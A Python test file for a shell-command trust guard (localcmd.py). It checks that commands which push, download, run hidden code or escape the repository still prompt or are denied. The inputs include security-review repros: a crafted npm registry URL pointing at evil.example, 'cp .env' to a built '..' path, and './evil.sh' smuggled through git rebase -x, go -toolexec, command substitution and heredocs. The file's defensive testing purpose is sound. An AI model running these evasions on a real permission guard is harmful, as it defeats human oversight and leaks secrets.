"""Tests for the unparsed-local opt-in (localcmd.py): CAN'T PARSE stops asking only for a
command that provably stays local, and then the guard's other checks still run. The cases
under "security review" are the repros from the review of #195; each asks or denies
without the opt-in and must decide the same with it. Fixture: trust_test.TrustFixture.
Run: make test-scripts
"""
from trust_test import TrustFixture

LOCAL = [
    "for f in a b; do git log -1 --format=%h -- sub/$f; done",
    "ls {{a,b}} && git status",
    "git status && ls *",
    "git status # what changed",
    "for f in a b; do wc -l sub/$f.md; done; make lint",
    "for f in a.b; do echo sub/${{f}}.md; done && git status",
]


class UnparsedLocal(TrustFixture):
    def test_off_by_default(self):
        self.assert_cases(LOCAL, "ask")

    def test_local_commands_pass(self):
        self.trust()
        self.assert_cases(LOCAL, None)

    def test_only_the_trusted_kind_passes(self):
        self.trust(["shell-writes", "accepted-adr"])
        self.assert_cases(LOCAL, "ask")

    def test_outward_or_outside_commands_still_ask(self):
        self.assert_unchanged([
            "for b in feature; do git push origin $b; done",
            "s=push; git $s; ls *",
            "x=pu; git ${{x}}sh && ls *",
            "for x in pu; do git ${{x}}sh; done",
            "git status && ls * && wget example.com",
            "git status && ls * && ssh host true",
            "git status && ls * && docker push x",
            "git status && ls * && npm publish",
            "npx foo && git status && ls *",
            "git status && ls * 'git push'",
            "git status && ls * https://example.com",
            "git config core.pager x; ls *",
            "git -c core.pager=x log; ls *",
            "git fetch origin && ls *",
            "for r in a; do git -C {f}/wt log; done",
            "git log -- $HOME && ls *",
            "git status && cat ~/x && ls *",
            "for x in a; do ls ../a {{b,c}}; git status; done",
            "for x in a; do git log -- sub/../../$x; done",
            "git log > /tmp/x && ls *",
            "ls * && git -C {w} status",
            "python3 -c 'print(1)' && git status && ls *",
            "awk 1 x && git status && ls *",
            "git status && ls * | xargs echo",
            "find . -exec true {{}} + && git status && ls *",
            "IFS=x; git status; ls *",
            "eval git status; ls *",
            "git status 'x",
            "git status && ls *(e:'true':)",
            "git status && =ls",
            "git status && ls * $'x'",
            "git status && ls *\\\nx",
            "$G status && git log && ls *",
            "./x.sh && git status && ls *",
        ])

    def test_security_review_run_time_options(self):
        """Finding 2: an option built at run time hides a deny or a code-running option."""
        self.assert_unchanged([
            "for o in --no-verify; do git commit -s $o -m \"feat: x\"; done",
            "for o in -n; do git commit -s $o -m \"feat: x\"; done",
            "read o <<< --no-verify; git commit -s $o -m \"feat: x\"",
            "for o in --no-verify; do git rebase $o origin/main; done",
            "for o in -x; do git rebase $o ./evil.sh HEAD~1; done",
            "read o <<< -toolexec=./evil.sh; go build $o ./...",
            "for o in -exec=./evil.sh; do go test $o ./...; done",
            "for o in -O./evil.sh; do git grep $o foo; done",
            "for o in --output; do git log $o=x; done",
            "git status && ls * && read x",
            "for f in a; do git log sub/$f; done",  # a $ word before -- in a tool command
            "for f in a; do make sub/$f; done",
        ])

    def test_security_review_hidden_commands(self):
        """Finding 3: commands inside $( ), backticks, <<< and unquoted heredocs."""
        self.assert_unchanged([
            "git status && echo * \"$(npm publish)\"",
            "git status && echo * `npm publish --access public`",
            "git status && echo * \"$(go get example.com/x)\"",
            "git status && echo * \"$(npm exec pkg)\"",
            "git status && echo * \"$(go build -toolexec=./evil.sh ./...)\"",
            "git status && echo * \"$(git rebase -x ./evil.sh HEAD~1)\"",
            "git status && echo * `git grep -O./evil.sh foo`",
            "git status && echo * \"$(make -f evil.mk)\"",
            "git log \"$(bash evil.sh)\" && ls *",
            "git status `bash evil.sh` && ls *",
            "cat <<< \"$(node evil.js)\" && git status",
            "cat <<EOF && git status && ls *\n$(sh evil.sh)\nEOF",
            "git status && diff <(ls) <(ls *)",
        ])

    def test_security_review_built_paths(self):
        """Finding 5: $d$d builds .., and a relative path may run through a symlink."""
        self.assert_unchanged([
            "for d in .; do git worktree add $d$d/wt; done",
            "for d in .; do git format-patch -o $d$d/out HEAD~1; done",
            "for d in .; do cp .env $d$d/leak; git status; done",
            "for d in ..; do ls sub/$d; git status; done",
            "for d in a; do ls sub/$d/..; git status; done",
            "for d in a; do echo $d; git status; done",
            "git status && ls L/* {{a,b}}",
        ])

    def test_security_review_wide_allowlists(self):
        """Finding 6: downloads and code runners that aren't local."""
        self.assert_unchanged([
            "for p in ps:; do npm ci --registry=htt$p//evil.example/; done",
            "ls * && npm ci",
            "ls * && go run ./x",
            "ls * && go generate ./...",
            "ls * && go mod download",
            "ls * && go tool x",
            "ls * && go env -w GOFLAGS=-x",
        ])


if __name__ == "__main__":
    import unittest
    unittest.main()
